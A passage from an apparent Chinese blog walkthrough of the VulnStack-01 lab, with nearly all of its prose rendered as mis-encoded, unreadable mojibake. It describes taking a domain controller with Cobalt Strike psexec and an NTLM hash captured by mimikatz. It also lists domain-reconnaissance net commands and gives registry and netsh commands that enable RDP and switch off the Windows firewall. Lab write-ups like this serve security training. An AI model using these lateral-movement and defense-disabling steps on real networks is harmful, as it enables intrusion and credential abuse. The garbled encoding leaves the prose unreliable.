viewå‘½ä»¤</h4><p><code>net view</code> å‘½ä»¤æ˜¯ Windows ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç½‘ç»œç®¡ç†å‘½ä»¤ï¼Œç”¨äºæŸ¥çœ‹ç½‘ç»œä¸­çš„è®¡ç®—æœºã€å…±äº«èµ„æºç­‰ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯å…¶å…·ä½“ç”¨æ³•å’ŒåŠŸèƒ½ï¼š</p><p>1ï¼‰åŸºæœ¬è¯­æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">NET VIEW <span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">\</span>computername <span class="token punctuation">[</span>/CACHE<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">[</span>/ALL<span class="token punctuation">]</span> <span class="token operator">|</span> /DOMAIN<span class="token punctuation">[</span>:domainname<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ï¼‰å¸¸è§ç”¨æ³•ç¤ºä¾‹</p><ul><li><p><strong>æŸ¥çœ‹å½“å‰åŸŸä¸­çš„æ‰€æœ‰è®¡ç®—æœº</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">net view<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>æŸ¥çœ‹æŒ‡å®šè®¡ç®—æœºçš„å…±äº«èµ„æº</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">net view \\computername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>æŸ¥çœ‹æŒ‡å®šè®¡ç®—æœºçš„æ‰€æœ‰å…±äº«èµ„æºï¼ˆåŒ…æ‹¬éšè—å…±äº«ï¼‰</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">net view \\computername /ALL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>æŸ¥çœ‹æŒ‡å®šåŸŸä¸­çš„æ‰€æœ‰è®¡ç®—æœº</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">net view /DOMAIN:domainname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></blockquote><p>ç‚¹å‡»<code>ç„å‡†é•œ</code>é€‰é¡¹å¡å¯ä»¥çœ‹åˆ°åŸŸç¯å¢ƒä¸­çš„ç›®æ ‡ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.36.24.png" style="zoom:50%;"><h1 id="å››ã€é€šè¿‡æŠ“å–å¯†ç -psexecæ‹¿ä¸‹åŸŸæ§"><a href="#å››ã€é€šè¿‡æŠ“å–å¯†ç -psexecæ‹¿ä¸‹åŸŸæ§" class="headerlink" title="å››ã€é€šè¿‡æŠ“å–å¯†ç +psexecæ‹¿ä¸‹åŸŸæ§"></a>å››ã€é€šè¿‡æŠ“å–å¯†ç +psexecæ‹¿ä¸‹åŸŸæ§</h1><h2 id="4-1-psexecç™»å½•"><a href="#4-1-psexecç™»å½•" class="headerlink" title="4.1 psexecç™»å½•"></a>4.1 psexecç™»å½•</h2><h3 id="4-4-1-åˆ›å»ºç›‘å¬å™¨"><a href="#4-4-1-åˆ›å»ºç›‘å¬å™¨" class="headerlink" title="4.4.1 åˆ›å»ºç›‘å¬å™¨"></a>4.4.1 åˆ›å»ºç›‘å¬å™¨</h3><ul><li>åˆ›å»ºä¸€ä¸ª<code>windows_smb/bind_pipe</code>ç›‘å¬å™¨</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.44.56.png" style="zoom:50%;"><h3 id="4-4-2-psexecç™»å½•"><a href="#4-4-2-psexecç™»å½•" class="headerlink" title="4.4.2 psexecç™»å½•"></a>4.4.2 psexecç™»å½•</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.45.33.png" style="zoom:50%;"><p>ç„¶åå³é”®é€‰æ‹©ç™»å½•æ¨¡å—-&gt;psexecåŠŸèƒ½ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.46.41.png" style="zoom:50%;"><p>é€‰æ‹©å£ä»¤å¯†ç ã€é€‰æ‹©åˆšåˆ›å»ºçš„ç›‘å¬å™¨ã€é€‰æ‹©ä¼šè¯ï¼Œç„¶åç‚¹å‡»å¼€å§‹ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.48.58.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.51.11.png" style="zoom:50%;"><p>ç­‰å¾…ï¼Œä½†æ˜¯è¿æ¥å»ºç«‹å¤±è´¥äº†ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.52.18.png" style="zoom:50%;"><p>å¦‚æœåƒä¸Šå›¾æ‰€ç¤ºè¿æ¥å¤±è´¥ã€‚</p><p>é‚£ä¹ˆå¯ä»¥å°è¯•å…¶ä»–ä»¤ç‰Œï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.53.37.png" style="zoom:50%;"><p>ç‚¹å‡»å¼€å§‹ä¹‹åç­‰å¾…è¿æ¥å»ºç«‹ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.54.03.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.55.34.png" style="zoom:50%;"><p>è¿˜æ˜¯æ²¡åŠæ³•æˆåŠŸç™»å½•ã€‚</p><p>å†è¯•ä¸€ä¸‹192.168.93.2è¿™å°ä¸»æœºï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2010.59.06.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.00.22.png" style="zoom:50%;"><p>ç™»å½•å¤±è´¥ã€‚</p><p>æ›´æ”¹ç™»å½•å‡­è¯ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.01.03.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.02.26.png" style="zoom:50%;"><p>æˆåŠŸå»ºç«‹åˆ°å†…ç½‘ä¸»æœº192.168.93.2çš„beaconè¿æ¥ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.03.33.png" style="zoom:50%;"><h2 id="4-2-æ‹¿ä¸‹åŸŸæ§"><a href="#4-2-æ‹¿ä¸‹åŸŸæ§" class="headerlink" title="4.2 æ‹¿ä¸‹åŸŸæ§"></a>4.2 æ‹¿ä¸‹åŸŸæ§</h2><p>é€šè¿‡æ–‡ä»¶ç®¡ç†å¯ä»¥æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿçš„æ–‡ä»¶ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.09.13.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°<code>C:\windows</code>ä¸‹æœ‰åŸŸæ§å­˜å‚¨æ–‡ä»¶å¤¹NTDSå’Œæ ¸å¿ƒæ•°æ®æ–‡ä»¶htds.ditã€‚</p><p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.11.27.png" alt="æˆªå±2025-02-18 11.11.27"></p><p>æˆåŠŸæ‹¿ä¸‹åŸŸæ§ã€‚</p><p>åœ¨beconä¸­æŸ¥çœ‹è·å–åˆ°çš„æƒé™ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.23.29.png" style="zoom:50%;"><p>æ­å»ºé¶åœºæ—¶ï¼Œå°†win2008ï¼ˆåŸŸæ§ï¼‰çš„å¯†ç ä¿®æ”¹ä¸ºäº†hongrisec@2025ï¼Œä½†æ˜¯åœ¨webæœåŠ¡å™¨ä¸Šä½¿ç”¨mimikatzæŠ“å–hashæ—¶æ‹¿åˆ°äº†NTLMå“ˆå¸Œå€¼ï¼Œpsexecç™»å½•æ—¶æŒ‡å®šå“ˆå¸Œä»¤ç‰Œå°±å¯ä»¥ç™»å½•åŸŸæ§ã€‚</p><p>æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•æ‹¿ä¸‹åŸŸç©ºå‘¢ï¼Ÿåé—¨åˆ†è§£ã€‚</p><h1 id="äº”ã€åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#äº”ã€åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="äº”ã€åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>äº”ã€åŸŸå†…ä¿¡æ¯æ”¶é›†</h1><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„å†…ç½‘ä¿¡æ¯æ”¶é›†çš„å‘½ä»¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ipconfig /all            <span class="token comment">#æŸ¥çœ‹ä¸»DNSåç¼€ï¼Œä¸ä¸ºç©ºé€šå¸¸æ˜¯å­˜åœ¨åŸŸç¯å¢ƒçš„</span>net view                 <span class="token comment"># æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºå</span>net config Workstation   <span class="token comment"># æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸ</span>net user                 <span class="token comment"># æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨</span>net user /domain         <span class="token comment"># æŸ¥çœ‹åŸŸç”¨æˆ·</span>net localgroup administrators <span class="token comment"># æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰</span>net view /domain         <span class="token comment"># æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span>net user ç”¨æˆ·å /domain   <span class="token comment"># è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</span>net group /domain        <span class="token comment"># æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰</span>net group ç»„å /domain    <span class="token comment"># æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</span>net group <span class="token string">"domain admins"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—</span>net group <span class="token string">"domain computers"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå</span>net group <span class="token string">"doamin controllers"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-1-æ¢æµ‹æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#5-1-æ¢æµ‹æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="5.1 æ¢æµ‹æ˜¯å¦å­˜åœ¨åŸŸ"></a>5.1 æ¢æµ‹æ˜¯å¦å­˜åœ¨åŸŸ</h2><h3 id="5-1-1-ipconfig-all"><a href="#5-1-1-ipconfig-all" class="headerlink" title="5.1.1 ipconfig /all"></a>5.1.1 <code>ipconfig /all</code></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ipconfig /all  <span class="token comment">#æŸ¥çœ‹ä¸»DNSåç¼€ï¼Œä¸ä¸ºç©ºé€šå¸¸æ˜¯å­˜åœ¨åŸŸç¯å¢ƒçš„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>antswordä¸­æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.35.58.png" style="zoom:60%;"><p>ä¸»DNSåç¼€ä¸º<code>god.org</code>ï¼Œåˆ™åŸŸç¯å¢ƒä¸ºgod.orgã€‚</p><ul><li>CSä¸­æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shell ipconfig /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.37.36.png" style="zoom:50%;"><h3 id="5-1-2-net-config-workstation"><a href="#5-1-2-net-config-workstation" class="headerlink" title="5.1.2  net config workstation"></a>5.1.2  <code>net config workstation</code></h3><p>ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤<code>net config workstation</code> æ¥æŸ¥çœ‹å½“å‰è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸç­‰å…¨é¢çš„ä¿¡æ¯ã€‚</p><blockquote><h4 id="ä¸¤ä¸ªåæ–œæ ï¼ˆ-ï¼‰"><a href="#ä¸¤ä¸ªåæ–œæ ï¼ˆ-ï¼‰" class="headerlink" title="ä¸¤ä¸ªåæ–œæ ï¼ˆ\\ï¼‰"></a>ä¸¤ä¸ªåæ–œæ ï¼ˆ<code>\\</code>ï¼‰</h4><p>åœ¨ Windows ç½‘ç»œç¯å¢ƒä¸­ï¼Œè®¡ç®—æœºåå‰é¢çš„ä¸¤ä¸ªåæ–œæ ï¼ˆ<code>\\</code>ï¼‰æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç¬¦å·ï¼Œç”¨äºè¡¨ç¤ºç½‘ç»œè·¯å¾„æˆ–ç½‘ç»œèµ„æºã€‚å…·ä½“æ¥è¯´ï¼Œ<code>\\</code> è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªç½‘ç»œå…±äº«èµ„æºçš„è·¯å¾„å‰ç¼€ã€‚</p></blockquote><ul><li>antswordä¸­æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2011.42.05.png" style="zoom:50%;"><p>å·¥ä½œç«™åŸŸï¼š<code>god.org</code></p><ul><li>CSä¸­æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.20.15.png" style="zoom:50%;"><p>é€šè¿‡<code>è®¡ç®—æœºå…¨å</code>ã€<code>å·¥ä½œç«™åŸŸ</code>ã€<code>å·¥ä½œç«™åŸŸDNSåç§°</code>å’Œ<code>ç™»å½•åŸŸ</code>ç­‰å­—æ®µæ¨æ–­å‡ºå­˜åœ¨åŸŸç¯å¢ƒï¼Œä¸”ä¸º<code>GOD</code>ã€‚</p><h3 id="5-1-3-net-time-domain"><a href="#5-1-3-net-time-domain" class="headerlink" title="5.1.3 net time /domain"></a>5.1.3 net time /domain</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net <span class="token function">time</span> /domain <span class="token comment"># åŸŸæœåŠ¡å™¨éƒ½ä¼šåŒæ—¶ä½œä¸ºæ—¶é—´æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä½¿ç”¨è¯¥å‘½ä»¤æ¥åˆ¤æ–­ä¸»åŸŸã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¿è¡Œ net time /domain è¯¥å‘½ä»¤åï¼Œä¸€èˆ¬ä¼šæœ‰å¦‚ä¸‹ä¸‰ç§æƒ…å†µ: </p><p>1.å­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ï¼Œæç¤ºè¯´æ˜æƒé™ä¸å¤Ÿ  </p><p>C:\Users&gt;bypass&gt;net time /domain  å‘ç”Ÿç³»ç»Ÿé”™è¯¯ 5  æ‹’ç»è®¿é—®ã€‚</p><p> 2.å­˜åœ¨åŸŸï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·   </p><p>C:\Users\Administrator&gt;net time /domain   \dc.test.com çš„å½“å‰æ—¶é—´æ˜¯ 2020/10/23 21:18:37    å‘½ä»¤æˆåŠŸå®Œæˆã€‚</p><p> 3.å½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸ</p><p> C:\Users\Administrator&gt;net time /domain   æ‰¾ä¸åˆ°åŸŸ WORKGROUP çš„åŸŸæ§åˆ¶å™¨ã€‚</p></blockquote><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.03.30.png" style="zoom:50%;"><p>é€šè¿‡æ—¶é—´å›æ˜¾å¯ä»¥å‘ç°ï¼Œæ—¶é—´æœåŠ¡å™¨æ˜¯owa.god.orgï¼Œå…¶å®èƒ½å¤Ÿä»ä¾§é¢å°è¯åŸŸä¸ºGODï¼ŒåŸŸæ§çš„è®¡ç®—æœºåæ˜¯OWAã€‚</p><h2 id="5-2-æ”¶é›†åŸŸä¿¡æ¯"><a href="#5-2-æ”¶é›†åŸŸä¿¡æ¯" class="headerlink" title="5.2 æ”¶é›†åŸŸä¿¡æ¯"></a>5.2 æ”¶é›†åŸŸä¿¡æ¯</h2><h3 id="5-2-1-net-view-domain"><a href="#5-2-1-net-view-domain" class="headerlink" title="5.2.1 net view /domain"></a>5.2.1 <code>net view /domain</code></h3><p>æŸ¥çœ‹å½“å‰ç½‘ç»œç¯å¢ƒä¸­æœ‰å¤šå°‘ä¸ªåŸŸï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net view /domain <span class="token comment">#æŸ¥çœ‹å½“å‰ç½‘ç»œç¯å¢ƒä¸­æœ‰å¤šå°‘ä¸ªåŸŸ</span>net view /domain:domainname <span class="token comment">#æŸ¥çœ‹æŸä¸ªåŸŸä¸­çš„è®¡ç®—æœºæœ‰å“ªäº›</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.34.34.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.35.22.png" style="zoom:50%;"><h3 id="5-2-2-net-group-domain"><a href="#5-2-2-net-group-domain" class="headerlink" title="5.2.2 net group /domain"></a>5.2.2 <code>net group /domain</code></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group /domain <span class="token comment">#æŸ¥çœ‹åŸŸå†…çš„ç”¨æˆ·ç»„ï¼ˆåœ¨åŸŸæ§ä¸Šæ‰§è¡Œï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.40.06.png" style="zoom:60%;"><p>åœ¨AntSwordä¸­æ‰§è¡Œæ²¡æœ‰ç»“æœã€‚</p><blockquote><h4 id="é¶åœºæ’é”™ï¼š"><a href="#é¶åœºæ’é”™ï¼š" class="headerlink" title="é¶åœºæ’é”™ï¼š"></a>é¶åœºæ’é”™ï¼š</h4><p>æŠ¥é”™å†…å®¹ï¼š<code>å‘ç”Ÿç³»ç»Ÿé”™è¯¯1355 æŒ‡å®šçš„åŸŸä¸å­˜åœ¨ï¼Œæˆ–æ— æ³•è”ç³»</code>.</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.47.57.png" style="zoom:70%;"><p>å‘ç°è”ç³»ä¸åˆ°åŸŸæ§åˆ¶å™¨ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.53.53.png" style="zoom:50%;"><p>æ‰“å¼€DMZåŒºçš„webæœåŠ¡å™¨ï¼Œé…ç½®192.168.93.0/24ç½‘æ®µçš„ç½‘å¡ï¼Œé…ç½®DNSä¸ºåŸŸæ§ipã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.55.23.png" style="zoom:50%;"><p>é…ç½®å®ŒDNSä¹‹åé‡æ–°æ‰§è¡Œå‘½ä»¤ï¼ŒæŠ¥<code>æ‹’ç»è®¿é—®</code>çš„é”™è¯¯ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2013.56.21.png" style="zoom:60%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.00.24.png" style="zoom:60%;"><p>ä½†æ˜¯å½“å‰ç”¨æˆ·å·²ç»æ˜¯administratoræƒé™äº†ã€‚</p><p>ä½†æ˜¯åœ¨CSçš„beconä¸­æ˜¯å¯ä»¥æ‰§è¡Œäº†ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.02.45.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.03.30.png" style="zoom:50%;"></blockquote><p><code>net group /domain</code>åœ¨DCä¸Šæ‰§è¡Œä¹‹åï¼ŒæŸ¥è¯¢åˆ°å½“å‰åŸŸä¸‹çš„ç”¨æˆ·ç»„ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.02.45.png" style="zoom:50%;"><h3 id="5-2-3-net-group-domain-controllers-domain"><a href="#5-2-3-net-group-domain-controllers-domain" class="headerlink" title="5.2.3 net group &quot;domain controllers&quot; /domain"></a>5.2.3 <code>net group "domain controllers" /domain</code></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group ç»„å /domain    <span class="token comment"># æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.10.25.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°åŸŸæ§çš„ä¸»æœºåæ˜¯<code>OWA</code>ã€‚</p><h3 id="5-2-4-net-view"><a href="#5-2-4-net-view" class="headerlink" title="5.2.4 net view"></a>5.2.4 <code>net view</code></h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net view                 <span class="token comment"># æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºå</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¡®è®¤åŸŸæ§ä¸»æœºçš„åç§°ä¸º OWA å†æ‰§è¡Œ <code>net view</code> æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºä¿¡æ¯ï¼ˆä¸»æœºåç§°ã€IPåœ°å€ï¼‰.</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.14.02.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.14.51.png" style="zoom:50%;"><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çŸ¥é“äº†åŸŸåã€åŸŸä¸‹çš„åˆ†ç»„ã€åŸŸæ§å’ŒåŸŸå†…ä¸»æœºçš„åŸºæœ¬ä¿¡æ¯ã€‚</p><ul><li><p>åŸŸæ§ï¼šOWA 192.168.93.2</p></li><li><p>åŸŸå†…ç”¨æˆ·ï¼šROOT-TVI862UBEH 192.168.93.10</p></li></ul><h1 id="å…­ã€RDPç™»å½•DMZåŒºçš„webæœåŠ¡å™¨"><a href="#å…­ã€RDPç™»å½•DMZåŒºçš„webæœåŠ¡å™¨" class="headerlink" title="å…­ã€RDPç™»å½•DMZåŒºçš„webæœåŠ¡å™¨"></a>å…­ã€RDPç™»å½•DMZåŒºçš„webæœåŠ¡å™¨</h1><p>å½“å‰å·²ç»è·å–åˆ°äº†DMZåŒºwebæœåŠ¡å™¨çš„systemæƒé™ï¼Œé‚£ä¹ˆå¼€å¯3389ï¼Œè®©æˆ‘ä»¬è¿œç¨‹ç™»å½•åº”è¯¥ä¸æ˜¯éš¾äº‹ã€‚</p><p>Win7è·³æ¿æœº é»˜è®¤æ˜¯ä¸å¼€å¯3389çš„ï¼Œè¿™ä¸€ç‚¹ä»æˆ‘ä»¬å‰æœŸçš„nmapæ‰«æä¹Ÿèƒ½çœ‹åˆ°ï¼›åŒæ—¶è¿˜æœ‰é˜²ç«å¢™ï¼Œä¸è¿‡é˜²ç«å¢™æˆ‘ä»¬å·²ç»åœ¨é¶åœºæ­å»ºç¯èŠ‚å…³é—­äº†ã€‚</p><h2 id="6-1-æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£"><a href="#6-1-æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£" class="headerlink" title="6.1 æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£"></a>6.1 æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£</span>REG ADD HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<span class="token comment">#æ·»åŠ é˜²ç«å¢™è§„åˆ™</span>netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"Open 3389"</span> <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">action</span><span class="token operator">=</span>allow <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">3389</span><span class="token comment">#å…³é—­é˜²ç«å¢™</span>netsh firewall <span class="token builtin class-name">set</span> opmode disable   <span class="token comment">#winsows server 2003 ä¹‹å‰</span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off <span class="token comment">#winsows server 2003 ä¹‹å</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.37.28.png" style="zoom:50%;"><p>ç”±äºä¹‹å‰é˜²ç«å¢™å…³é—­è¿‡äº†ï¼Œæ‰€ä»¥å…ˆä¸åš<code>æ·»åŠ é˜²ç«å¢™è§„åˆ™</code>å’Œ<code>å…³é—­é˜²ç«å¢™</code>è¿ä¸ªæ“ä½œã€‚</p><ul><li>æ­¤å¤–å¯ä»¥è”åŠ¨msfè·å–meterpreter shellï¼Œé€šè¿‡æ‰§è¡Œå‘½ä»¤<code>run 